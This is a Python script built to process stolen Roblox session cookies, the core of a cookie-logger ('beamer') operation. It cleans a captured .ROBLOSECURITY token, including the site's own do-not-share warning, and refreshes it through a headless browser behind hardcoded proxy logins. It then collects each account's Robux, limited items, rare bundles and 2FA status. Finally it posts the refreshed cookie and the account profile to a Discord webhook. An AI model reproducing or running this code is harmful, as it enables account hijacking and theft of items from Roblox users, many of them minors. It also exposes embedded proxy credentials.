import sys
import os
import re
import time
import random
import requests
from datetime import datetime, timezone
from playwright.sync_api import sync_playwright

# --- Webshare Authenticated Proxies ---
RAW_WEBSHARE_PROXIES = [
    "45.38.107.97:6014:saxqnmup:rgvs7uvqydbm",
    "64.137.96.74:6641:saxqnmup:rgvs7uvqydbm",
    "198.23.243.226:6361:saxqnmup:rgvs7uvqydbm",
    "38.154.185.97:6370:saxqnmup:rgvs7uvqydbm",
    "84.247.60.125:6095:saxqnmup:rgvs7uvqydbm",
    "191.96.254.138:6185:saxqnmup:rgvs7uvqydbm",
    "198.46.161.42:5092:saxqnmup:rgvs7uvqydbm",
    "64.137.10.153:5803:saxqnmup:rgvs7uvqydbm",
    "104.164.49.38:7693:saxqnmup:rgvs7uvqydbm",
    "23.26.71.145:5628:saxqnmup:rgvs7uvqydbm"
]

def format_webshare(p_str):
    parts = p_str.strip().split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}", ip, port, user, pwd
    return None, None, None, None, None

SPECIAL_ASSETS = {
    "Korblox": 139607718,
    "Headless": 134082579,
    "Violet Valk": 1402432199,
}

GAMES = {
    "Adopt Me": 383310974,
    "MM2": 142823291,
    "PS99": 3259657279,
}

def extract_and_clean_cookie(raw_input):
    if not raw_input:
        return ""
    raw_str = str(raw_input).strip()
    
    if len(raw_str) < 30 and not raw_str.startswith("sys") and not raw_str.startswith("_|WARNING"):
        return None

    ps_match = re.search(r'System\.Net\.Cookie\(\s*["\']\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', raw_str)
    cookie = ps_match.group(1) if ps_match else raw_str
    if (cookie.startswith('"') and cookie.endswith('"')) or (cookie.startswith("'") and cookie.endswith("'")):
        cookie = cookie[1:-1].strip()
    if cookie.startswith(".ROBLOSECURITY="):
        cookie = cookie[len(".ROBLOSECURITY="):].strip()
    warning_text = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
    if cookie.startswith(warning_text):
        cookie = cookie[len(warning_text):].strip()
    
    cleaned = cookie.lstrip('.').rstrip(';').strip()
    if len(cleaned) < 50:
        return None
        
    return cleaned

def refresh_cookie_via_playwright(raw_cookie):
    """Uses Playwright to hit Roblox and capture the refreshed .ROBLOSECURITY token"""
    shuffled_proxies = list(RAW_WEBSHARE_PROXIES)
    random.shuffle(shuffled_proxies)
    
    chosen_proxy_str = shuffled_proxies[0] if shuffled_proxies else None
    proxy_url, ip, port, user, pwd = format_webshare(chosen_proxy_str) if chosen_proxy_str else (None, None, None, None, None)

    with sync_playwright() as p:
        launch_args = {}
        if proxy_url and ip and port:
            launch_args["proxy"] = {
                "server": f"http://{ip}:{port}"
            }
            if user and pwd:
                launch_args["proxy"]["username"] = user
                launch_args["proxy"]["password"] = pwd

        try:
            browser = p.chromium.launch(headless=True, **launch_args)
            context = browser.new_context()
            
            context.add_cookies([{
                'name': '.ROBLOSECURITY',
                'value': raw_cookie,
                'domain': '.roblox.com',
                'path': '/',
                'httpOnly': True,
                'secure': True
            }])
            
            page = context.new_page()
            page.goto("https://www.roblox.com/home", timeout=45000)
            
            if "login" in page.url or page.locator("#login-button").count() > 0:
                browser.close()
                return raw_cookie # fallback to original if refresh page forced login

            cookies = context.cookies()
            refreshed = None
            for c in cookies:
                if c['name'] == '.ROBLOSECURITY':
                    refreshed = c['value']
                    break
            
            browser.close()
            return refreshed if refreshed else raw_cookie
        except Exception:
            return raw_cookie

def get_working_session(roblosecurity):
    session = requests.Session()
    
    session.headers.update({
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9,ar;q=0.8,en-GB;q=0.7",
        "Connection": "close",
        "Content-Type": "application/json",
        "Origin": "https://www.roblox.com",
        "Referer": "https://www.roblox.com/",
        "Sec-Ch-Ua": '"Google Chrome";v="155", "Chromium";v="155", "Not(A:Brand";v="24"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36"
    })

    manual_proxy = os.environ.get('PROXY_URL')
    test_proxies = [manual_proxy] if manual_proxy else []
    
    formatted_list = [format_webshare(p)[0] for p in RAW_WEBSHARE_PROXIES if format_webshare(p)[0]]
    random.shuffle(formatted_list)
    test_proxies.extend(formatted_list)

    for p in test_proxies:
        if not p:
            continue
        proxy_dict = {"http": p, "https": p}
        try:
            session.proxies = proxy_dict
            session.get("https://www.roblox.com/home", timeout=4)
            if roblosecurity:
                session.cookies.set(".ROBLOSECURITY", roblosecurity, domain=".roblox.com", path="/")
            
            test_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=4)
            if test_res.status_code == 200:
                return session
        except Exception:
            continue

    session.proxies = {}
    try:
        session.get("https://www.roblox.com/home", timeout=4)
    except Exception:
        pass
        
    if roblosecurity:
        session.cookies.set(".ROBLOSECURITY", roblosecurity, domain=".roblox.com", path="/")
        
    return session

def main():
    if len(sys.argv) < 2:
        sys.exit(1)
    
    webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
    if not webhook_url:
        sys.exit(1)

    raw_cookie = extract_and_clean_cookie(sys.argv[1])
    if not raw_cookie:
        sys.exit(0)

    # 1. Refresh cookie FIRST before touching stats endpoints
    print("[+] Refreshing cookie session...")
    refreshed_cookie = refresh_cookie_via_playwright(raw_cookie)

    # 2. Build verified requests session with the freshly updated token
    session = get_working_session(refreshed_cookie)

    auth_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=5)
    if auth_res.status_code != 200:
        sys.exit(1)
    
    auth_data = auth_res.json()
    user_id = auth_data.get("id")
    if not user_id:
        sys.exit(1)

    username = auth_data.get("name", "Unknown")
    display_name = auth_data.get("displayName", username)

    def safe_get(url, params=None):
        try:
            r = session.get(url, params=params, timeout=5)
            if r.status_code == 200:
                return r.json()
        except Exception:
            pass
        return {}

    user_info = safe_get(f"https://users.roblox.com/v1/users/{user_id}")
    created = user_info.get("created", "")
    age_days = 0
    if created:
        try:
            created_dt = datetime.fromisoformat(created.replace("Z", "+00:00"))
            age_days = (datetime.now(timezone.utc) - created_dt).days
        except Exception:
            pass

    robux_res = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/currency")
    robux = robux_res.get("robux", 0)

    trans_res = safe_get(
        f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals",
        params={"transactionType": "summary", "timeFrame": "Year"}
    )
    pending = trans_res.get("pendingRobuxTotal", 0)

    limiteds = []
    cursor = ""
    page_count = 0
    while page_count < 2:
        params = {"limit": 100}
        if cursor:
            params["cursor"] = cursor
        r = safe_get(
            f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles",
            params=params
        )
        if not isinstance(r, dict):
            break
        for item in r.get("data", []):
            limiteds.append(item.get("recentAveragePrice", 0))
        cursor = r.get("nextPageCursor")
        page_count += 1
        if not cursor:
            break

    rap = sum(limiteds)
    lim_count = len(limiteds)

    try:
        prem_res = session.get(
            f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership",
            timeout=5
        )
        premium = prem_res.json() is True
    except Exception:
        premium = False

    def check_bundle(bundle_id):
        try:
            r = session.get(
                f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/{bundle_id}/is-owned",
                timeout=5
            )
            return r.json() is True
        except Exception:
            return False

    def check_asset(asset_id):
        try:
            r = session.get(
                f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{asset_id}/is-owned",
                timeout=5
            )
            return r.json() is True
        except Exception:
            return False

    korblox = check_bundle(192)
    headless = check_bundle(201)
    violet_valk = check_asset(799742571)

    groups_res = safe_get(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles")
    groups = groups_res.get("data", [])
    group_count = len(groups)
    owned_groups = sum(1 for g in groups if g.get("role", {}).get("rank") == 255)

    email_ver = safe_get("https://accountsettings.roblox.com/v1/email").get("verified", False)
    twofa = safe_get("https://twostepverification.roblox.com/v1/metadata").get("twoStepVerificationEnabled", False)

    def check_played_and_passes(universe_id):
        played = False
        r = safe_get(
            f"https://badges.roblox.com/v1/users/{user_id}/badges",
            params={"limit": 100}
        )
        if isinstance(r, dict):
            for badge in r.get("data", []):
                if badge.get("awardingUniverse", {}).get("id") == universe_id:
                    played = True
        return played, 0

    adopt_played, _ = check_played_and_passes(383310974)
    mm2_played, _ = check_played_and_passes(142823291)
    ps99_played, _ = check_played_and_passes(3259657279)

    avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"

    payload = {
        "content": "@everyone",
        "username": f"{username} | Stats",
        "avatar_url": avatar_url,
        "embeds": [
            {
                "title": f"🎮 {username} | Roblox Stats",
                "description": f"[Stats Link](https://www.rolimons.com/player/{user_id}) | [Roblox Profile](https://www.roblox.com/users/{user_id}/profile)",
                "color": 0x2B2D31,
                "thumbnail": {"url": avatar_url},
                "fields": [
                    {"name": "🐱 Username", "value": f"```{username}```", "inline": False},
                    {"name": "📋 Account Stats", "value": f"+ Account Age: `{age_days} Days`\n+ Premium: `{premium}`", "inline": False},
                    {"name": "🪙 Robux", "value": f"Balance: `{robux:,}`\nPending: `{pending:,}`", "inline": True},
                    {"name": "💎 Limiteds", "value": f"RAP: `{rap:,}`\nLimiteds: `{lim_count}`", "inline": True},
                    {"name": "👑 Special Items", "value": f"+ Korblox: `{korblox}`\n+ Headless: `{headless}`\n+ Violet Valk: `{violet_valk}`", "inline": False},
                    {"name": "⚙️ Settings", "value": f"+ Email Verified: `{email_ver}`\n+ 2FA: `{twofa}`", "inline": True},
                    {"name": "👥 Groups", "value": f"Owned: `{owned_groups}`\nJoined: `{group_count}`", "inline": True},
                    {"name": "⭐ Games", "value": f"- Adopt Me: `{adopt_played}`\n- MM2: `{mm2_played}`\n- PS99: `{ps99_played}`", "inline": False}
                ],
                "footer": {"text": f"VERSION_01 | 13+ • {display_name}"},
                "timestamp": datetime.now(timezone.utc).isoformat()
            },
            {
                "title": "🍪 Refreshed Session Cookie",
                "description": f"```text\n{refreshed_cookie}\n```",
                "color": 0x2B2D31,
                "footer": {"text": f"Token Length: {len(refreshed_cookie)} chars"}
            }
        ],
        "allowed_mentions": {"parse": ["everyone"]}
    }

    requests.post(webhook_url, json=payload, timeout=5)

if __name__ == "__main__":
    main()
